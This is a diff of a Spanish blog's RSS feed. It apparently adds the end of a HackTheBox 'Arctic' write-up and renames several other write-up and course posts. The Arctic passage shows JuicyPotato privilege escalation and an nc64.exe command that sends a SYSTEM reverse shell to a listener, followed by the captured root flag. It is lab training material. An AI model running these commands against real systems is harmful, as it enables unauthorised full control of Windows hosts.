+&lt;p&gt;Verificamos que los archivos se subieron correctamente.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;dir
+ Volume in drive C has no label.
+ Volume Serial Number is 5C03-76A8
+
+ Directory of C:\Windows\Temp\Privesc
+
+13/04/2023  04:57     &amp;lt;DIR&amp;gt;          .
+13/04/2023  04:57     &amp;lt;DIR&amp;gt;          ..
+13/04/2023  04:57            347.648 JuicyPotato.exe
+13/04/2023  04:57             45.272 nc64.exe
+               2 File(s)        392.920 bytes
+               2 Dir(s)   1.432.981.504 bytes free
+
+C:\Windows\Temp\Privesc&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Como ya tenemos ambos archivos, la idea es ahora que con el &lt;code&gt;JuicyPotato.exe&lt;/code&gt; podemos inyectar comandos de manera privilegiada.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;.\JuicyPotato.exe
+JuicyPotato v0.1 
+
+Mandatory args: 
+-t createprocess call: &amp;lt;t&amp;gt; CreateProcessWithTokenW, &amp;lt;u&amp;gt; CreateProcessAsUser, &amp;lt;*&amp;gt; try both
+-p &amp;lt;program&amp;gt;: program to launch
+-l &amp;lt;port&amp;gt;: COM server listen port
+
+
+Optional args: 
+-m &amp;lt;ip&amp;gt;: COM server listen address (default 127.0.0.1)
+-a &amp;lt;argument&amp;gt;: command line argument to pass to program (default NULL)
+-k &amp;lt;ip&amp;gt;: RPC server ip address (default 127.0.0.1)
+-n &amp;lt;port&amp;gt;: RPC server listen port (default 135)
+-c &amp;lt;{clsid}&amp;gt;: CLSID (default BITS:{4991d34b-80a1-4291-83b6-3328366b9097})
+-z only test CLSID and print token's user
+
+C:\Windows\Temp\Privesc&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Procedemos a ejecutarlo con los parametros necesarios:&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;Con &lt;code&gt;-t&lt;/code&gt; que es para crear un proceso vamos a usar &lt;code&gt;*&lt;/code&gt; para usar las dos opciones&lt;/li&gt;
+  &lt;li&gt;Con &lt;code&gt;-l&lt;/code&gt; un puerto (puede ser el que quieras)&lt;/li&gt;
+  &lt;li&gt;Con &lt;code&gt;-p&lt;/code&gt; vamos a ejecutar un programa, que en nuestro caso sera la &lt;code&gt;cmd.exe&lt;/code&gt; para atraves de ella ejecutar un comando privilegiado&lt;/li&gt;
+  &lt;li&gt;Con &lt;code&gt;-a&lt;/code&gt; le pasaremos el argumentos, donde le pasaremos la ruta donde recide el &lt;code&gt;nc64.exe&lt;/code&gt; para enviarnos una consola interactiva&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;p&gt;Nos ponemos en escucha en nuestro equipo y proseguimos a ejecutarlo, si vemos que no nos hace nada, hay que ejecutarlo varias veces.&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a &quot;/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.16.8 443&quot;
+.\JuicyPotato.exe -t * -l 1337 -p C:\Windows\System32\cmd.exe -a &quot;/c C:\Windows\Temp\Privesc\nc64.exe -e cmd 10.10.16.8 443&quot;
+Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
+....
+[+] authresult 0
+{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM
+
+[+] CreateProcessWithTokenW OK
+
+C:\Windows\Temp\PRIVESC&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Y recibimos la conexión&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-bash&quot;&gt;❯ rlwrap ncat -nlvp 443
+Ncat: Version 7.92 ( https://nmap.org/ncat )
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+Ncat: Connection from 10.10.10.11.
+Ncat: Connection from 10.10.10.11:49816.
+Microsoft Windows [Version 6.1.7600]
+Copyright (c) 2009 Microsoft Corporation.  All rights reserved.
+
+whoami
+whoami
+nt authority\system
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;Lo unico que nos queda por hacer es dirigirnos al directorio personal del usuario &lt;code&gt;administrator&lt;/code&gt; y visualizamos la segunda flag &lt;code&gt;root.txt&lt;/code&gt; :)&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-cmd&quot;&gt;cd C:\Users\Administrator\Desktop
+cd C:\Users\Administrator\Desktop
+
+type root.txt
+type root.txt
+4804d15552ecad867e5f3b60985e1d34
+
+C:\Users\Administrator\Desktop&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+        <pubDate>Tue, 11 Apr 2023 00:00:00 +0000</pubDate>
+        <link>http://localhost:4000/hackthebox/htb-writeup-Arctic</link>
+        <guid isPermaLink="true">http://localhost:4000/hackthebox/htb-writeup-Arctic</guid>
+        
+        <category>Adobe Coldfusion</category>
+        
+        <category>Directory traversal</category>
+        
+        <category>Cracking hash</category>
+        
+        <category>Schedule Tasks</category>
+        
+        <category>Create malicius JSP</category>
+        
+        <category>Abusing SeimpersonatePrivilege</category>
+        
+        
+        <category>hackthebox</category>
+        
+      </item>
+    
+      <item>
+        <title>Aprende a usar Git gratis desde cero y vuelvete un experto</title>
         <description>&lt;p&gt;Hola en esta ocasión hablaremos de &lt;code&gt;Git&lt;/code&gt; donde explicaremos paso a paso como funciona y el alcance que tiene que hace que sea necesario aprenderlo cuanto antes, asi que preparate por que debes aprender a usarlo a la de ya!.&lt;/p&gt;
 
 &lt;h2 id=&quot;indice-y-estructura&quot;&gt;Indice y Estructura&lt;/h2&gt;
@@ -1365,13 +1947,21 @@ Rama 'main' configurada para hacer seguimiento a la rama remota 'main' de 'origi
         
         <category>Repositorio</category>
         
+        <category>Experto</category>
+        
+        <category>Gratis</category>
+        
+        <category>Domina</category>
+        
+        <category>Github</category>
+        
         
         <category>articulos</category>
         
       </item>
     
       <item>
-        <title>Maquina - Sneakymailer</title>
+        <title>Maquina Sneakymailer - htb writeup</title>
         <description>&lt;p&gt;Hoy vamos a resolver una máquina &lt;code&gt;hackthebox&lt;/code&gt; de dificultad &lt;code&gt;media&lt;/code&gt;, la cual explotaremos a partir de información lekeada y realizando un ataque masivo de email, después migraremos a otro usuario abusando de un &lt;code&gt;pypi server&lt;/code&gt; creando un paquete malicioso y finalmente escalaremos privilegios como el usuario &lt;code&gt;root&lt;/code&gt; abusando de un privilegio de sudoers en &lt;code&gt;pip3&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
@@ -2257,7 +2847,7 @@ root
       </item>
     
       <item>
-        <title>Python3</title>
+        <title>aprende Python desde cero a avanzado curso completo</title>
         <description>&lt;p&gt;En esta ocasion hablaremos del lenguaje de programacion Python3, realizaremos todo un curso completo desde lo mas basico y explicaremos todo lo escencial para que se pueda llegar a dominar este lenguaje.&lt;/p&gt;
 
 &lt;blockquote&gt;
@@ -4007,7 +4597,7 @@ lista
       </item>
     
       <item>
-        <title>Maquina - Querier</title>
+        <title>Maquina Querier - htb writeup</title>
         <description>&lt;p&gt;El dia de hoy vamos a estar resolviendo la maquina &lt;code&gt;Querier&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Media&lt;/code&gt;. Comenzaremos enumerando los recursos compartidos &lt;code&gt;smb&lt;/code&gt; para obtener la contraseña de un usuario, informando que puede iniciar sesión en el &lt;code&gt;mssql-server&lt;/code&gt;. Para obtener el usuario en el sistema, podemos robar el hash del usuario &lt;code&gt;mssql-svc&lt;/code&gt; ejecutando el comando &lt;code&gt;xp_dirtree&lt;/code&gt; y finalmente para la escalada de privilegios al administrador que es bastante sencilla aprovecharemos el script &lt;code&gt;powerup.ps1&lt;/code&gt; de powersploit para obtener las credenciales administrativas alojadas en un archivo &lt;code&gt;xml&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;
@@ -4823,7 +5413,7 @@ Info: Establishing connection to remote endpoint
       </item>
     
       <item>
-        <title>Maquina - Ophiuchu</title>
+        <title>Maquina Ophiuchi - htb writeup</title>
         <description>&lt;p&gt;Hoy vamos a hacer una máquina &lt;code&gt;hackthebox&lt;/code&gt; de dificultad media, la cual va a ser explotada utilizando la vulnerabilidad de deserialización de &lt;code&gt;YAML&lt;/code&gt; para &lt;code&gt;SnakeYAML&lt;/code&gt; utilizada en aplicaciones java, y modificando un archivo &lt;code&gt;wasm&lt;/code&gt; para obtener privilegios de &lt;code&gt;root&lt;/code&gt;.&lt;/p&gt;
 
 &lt;p&gt;Vamos a comenzar creando un directorio con el nombre de la maquina:&lt;/p&gt;
@@ -5541,7 +6131,7 @@ bash-5.0#
       </item>
     
       <item>
-        <title>Maquina - Multimaster</title>
+        <title>Maquina Multimaster - htb writeup</title>
         <description>&lt;p&gt;Hola de nuevo el de hoy vamos a estar resolviendo la maquina &lt;code&gt;Multimaster&lt;/code&gt; de &lt;code&gt;hackthebox&lt;/code&gt; que es una maquina &lt;code&gt;Windows&lt;/code&gt; de dificultad &lt;code&gt;Insane&lt;/code&gt;, la cosa se va a tensar :smirk:. Comenzaremos realizando la enumeracion por &lt;code&gt;smb&lt;/code&gt;, despues usaremos &lt;code&gt;wfuzz&lt;/code&gt; para enumerar caracteres por fuerza bruta para validar una inyeccion, posteriormente crearemos un script en python donde realizaremos una &lt;code&gt;sql injection&lt;/code&gt; avanzada para hacer bypass un &lt;code&gt;waf&lt;/code&gt; incorporado en la maquina, obtendremos los &lt;code&gt;RID Y SID&lt;/code&gt; de los usuarios del dominio y con ellos encontraremos unas credenciales validas que nos permitiran conectarnos al sistema, donde aprovecharemos una vulnerabilidad asociada a una version de &lt;code&gt;Visual Studio Code&lt;/code&gt; que por medio de la exposicion &lt;code&gt;debugger&lt;/code&gt; lograremos obtener &lt;code&gt;RCE&lt;/code&gt;, finalmente usaremos BoodHound donde setearemos &lt;code&gt;kerberos dont require preauthetication&lt;/code&gt; a un usuario miembro del grupo &lt;code&gt;Server Operators&lt;/code&gt; y manipulando el binPath nos convertiremos en el usuario Administrator.&lt;/p&gt;
 
 &lt;p&gt;Vamos a comenzar como siempre creando un directorio con el nombre de la maquina:&lt;/p&gt;
